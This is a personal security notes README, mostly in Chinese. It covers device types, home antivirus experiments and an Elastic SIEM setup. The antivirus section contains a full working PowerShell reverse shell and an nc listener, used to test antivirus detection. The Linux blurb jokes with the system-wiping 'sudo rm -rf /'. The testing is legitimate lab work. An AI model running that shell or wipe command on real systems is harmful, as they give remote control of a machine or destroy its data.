# 网络安全
放生一些野生知识

## 内容

- [设备](#设备)
- [基础保护](#基础保护)
- [SIEM](#SIEM) to do
- [钓鱼](#钓鱼) to do
- [恶意软件](#恶意软件) to do
- [安全配置](#安全配置) to do
# 设备
在进行攻击或者保护前，我们需要知道一台设备是干什么的，才能实行对应的手段

### **电脑**
闻斗死，鳞你死，迈哦s，常见的电脑系统，好了你可以进行攻击防御了。

-**Windows**:  
    微软发布维护的系统，个人电脑装的最多的系统，性能本最好的驾驶者，更是广告和屎山的集合体 :hankey:  
    但是，我还是喜欢你啊，windows小姐。告诉linux，我今晚不回去了。 
  
-**Linux**:  
    此企鹅非彼企鹅 :penguin:, 维护更新由社区完成。优点是系统简单，缺点也是系统简单。（喜欢我的指令吗，喜欢我的板砖吗）sudo rm -rf /
  
-**Macos**:  
    赞颂世界上最好用的系统，赞美那漂亮的界面，歌颂她完美无瑕的架构。好吧，其实我根本没用过。  
  
-**ChromeOS**:  
    好东西，本身系统非常干净，干净到基本就用来打开文件，上网，看邮箱。然后没啦。内置个类似linux虚拟机的东西，可以随便玩不怕坏，只不过没直接买linux好而已。（500买回来还要什么直升机啊）  

-**服务器**:  
  接收请求，返回需要的内容或者服务。有非常多服务器的类型。 

-**路由器**:  
  不同网络之间传输要使用的设备。

-**交换机**:  
  本地网络通信使用的设备。

-**物联网**:  
  奇奇怪怪的东西连上网就是物联网了，冰箱汽车扫地机，不过攻击面变多变大了。

# 基础保护
使用电脑防护程序，360，腾讯电脑管家。现代杀毒软件通常都会配备基于特征，代码，行为的检测。这类杀毒软件可以应对大部分已经发生过的攻击，不过嘛，代价是什么。现代杀毒软件通常都会有基于特征，分析代码的扫盘，实时监控软件行为，然后附带一堆功能。剩下的功能好不好用就见仁见智了，什么上网防护，代理，固化...

## 基于特征  
生成文件的哈希值，或者签名，去和存储在库里的已知恶意软件进行比较。平时扫盘用的就是这个。主播主播，没遇到过这个病毒怎么办，那就给了。  

## 代码扫描  
根据代码扫描来防御，和基于特征差不多，都是静态  

这里下载了好几个杀毒软件来玩，俗称养蛊。腾讯管家希望下载个游戏中心被360挡了，360想改点什么被管家挡了，avast和AVG和无能的丈夫一样，啥都不干。下面是一个Wscript.exe的定时任务，每隔一段时间会启动powershell并且执行修改防火墙的指令。（不直接使用powershell定时是因为用了hidden还是会闪一下窗口出来）第一个是wscript，第二个是powershell
```
Set WshShell = CreateObject("WScript.Shell")

WshShell.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ""C:\Scripts\Netrule.ps1""", 0, False
```
```
$Folder = "<path to the file>"
$LogFile = "path to the log"

try {

    if (-not (Test-Path $Folder)) {
        "ERROR: Folder does not exist: $Folder" | Out-File $LogFile -Append
        exit 1
    }


    Get-ChildItem $Folder -Filter *.exe -File -Recurse | ForEach-Object {

        $RuleName = "Block Network - " + $_.FullName


        if (-not (Get-NetFirewallRule -DisplayName $RuleName -ErrorAction SilentlyContinue)) {

            New-NetFirewallRule `
                -DisplayName $RuleName `
                -Direction Outbound `
                -Program $_.FullName `
                -Action Block `
                -Profile Any `
                -ErrorAction Stop | Out-Null


            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - CREATED: $($_.FullName)" |
                Out-File $LogFile -Append
        }
    }


    Get-NetFirewallRule |
    Where-Object DisplayName -like "Block Network -*" |
    ForEach-Object {

        $Rule = $_
        $App = $Rule | Get-NetFirewallApplicationFilter

        if ($App.Program -and -not (Test-Path $App.Program)) {


            $Rule | Remove-NetFirewallRule
        }
    }
}
catch {

    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - ERROR: $($_.Exception.Message)" |
        Out-File $LogFile -Append
}
```
这个还算合法的程序只有360弹出警告，不知道算是360太敏感还是其它太松了。他只警告wscript的代码，应该是只检测该代码执行powershell的指令却没有去查powershell干什么了。
<picture>
 <img alt="the case used 360" src="images/360case1.png">
</picture>

然后就是一些疑似恶意代码，如果平时会安装个人或小组织开发的插件什么的就会警告你。这里AVG和avast都是提示PUP可疑，360和管家就显示后门了。然后就是比较坑的地方了，删了显示的恶意代码后，打开那个软件会被不知道哪个杀毒杀了（都是米哈游干的）。  
360有个比较贴心的功能就是所有usb里的软件运行都会询问你，算是避免你在路上看到个usb，兴奋的插入自己电脑然后电脑就被黑了。路上不扫二维码，不捡奇奇怪怪的东西，不要拿着菜刀瞎晃，不要大喊回应我吧，爱莉希雅。

##**基于行为**  
根据一个程序做出什么事情来判断是否恶意
一个小尝试就是把一份c2放进隔离区，再通过c2来启动c2（别问为什么喜欢用c2，这玩意真省时间啊[https://revshells.com](https://www.revshells.com/))
在linux机执行（控制）
```
nc -lnvp <喜欢的端口>
```
在windows执行reverse.ps1（被控制）
```
$LHOST = "<另一台机>"; $LPORT = <喜欢的端口>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

在控制机中开启另一个tab，再次执行一样的指令（换个端口），再回到开始的端口复制输入reverse.ps1的内容，就会得到
<img alt="behaviour" src="images/behaviour.png">  
这个子程序就被杀了，应该是因为windows执行的文件在隔离区，由reverse.ps1开启的C2还能存活。

在一个正常环境中，我们可以使用杀毒软件来做基础的保护，辅助我们隔离一些可以软件。但是，做的小实验里，好几个杀毒程序都不会警告这些是恶意程序或者恶意行为。选择时可以对比一下网上风评或者自己动手实验一下，想想是不是一点风险都不希望有。个人感觉不是企业环境，有个能提示你当前访问的网站可疑就行了，在不会看网址的情况下，这应该可疑避免大部分恶意软件了。刷视频好像大多数都是访问了些非官网，才下载到恶意软件的。  
# **SIEM**  
Here I use the elastic as the example, the reason is I like the visualization process tree in it.(I am using the windows, linux and mac have to use other way)

Donwload the kibana and elastic search zip files, extract it.  
In elastic/bin, enter command below to set password  
```
.\elasticsearch-reset-password.bat -u kibana_system -i
```
Config the kibana-version/config/kibana.yml, add
```
server.port: 5601
server.host: "localhost"

elasticsearch.username: "kibana_system"
elasticsearch.password: "password set"

elasticsearch.hosts: ["https://localhost:9200"]
elasticsearch.ssl.certificateAuthorities: ["path to elastic/elasticsearch-9.5.2/config/certs/http_ca.crt"]
```
Then execute the kibana-version/bin/kibana.bat and elasticsearch-version/bin/elasticsearch.bat. Wait for a moment and then access the localhost:5601.  
Add the windows integration and follow the step to extract the file.  
Download the sysmon.  
Open cmd or powershell as administrator, configure the locate to the elastic agent, configure the elastic-agent.yml
```
outputs:
  default:
    type: elasticsearch
    hosts:
      - "https://127.0.0.1:9200"
    username: "<username>"
    password: "<password>"
    preset: balanced
    ssl:
      certificate_authorities:
        - '<path to certificate> like D:\elasticsearch-9.5.2-windows-x86_64\elasticsearch-9.5.2\config\certs\http_ca.crt'

inputs:
  - type: winlog
    id: windows-security
    use_output: default
    streams:
      - name: Security
        data_stream:
          type: logs
          dataset: windows.security
          namespace: default
        winlog:
          channel: Security

  - type: winlog
    id: windows-system
    use_output: default
    streams:
      - name: System
        data_stream:
          type: logs
          dataset: windows.system
          namespace: default
        winlog:
          channel: System

  - type: winlog
    id: windows-application
    use_output: default
    streams:
      - name: Application
        data_stream:
          type: logs
          dataset: windows.application
          namespace: default
        winlog:
          channel: Application

  - type: winlog
    id: windows-sysmon
    use_output: default
    streams:
      - name: Microsoft-Windows-Sysmon/Operational
        data_stream:
          type: logs
          dataset: windows.sysmon_operational
          namespace: default
        winlog:
          channel: Microsoft-Windows-Sysmon/Operational
```
Use command to Restart the agent
```
Restart-Service "Elastic Agent"
```
Now, the search should display the events.
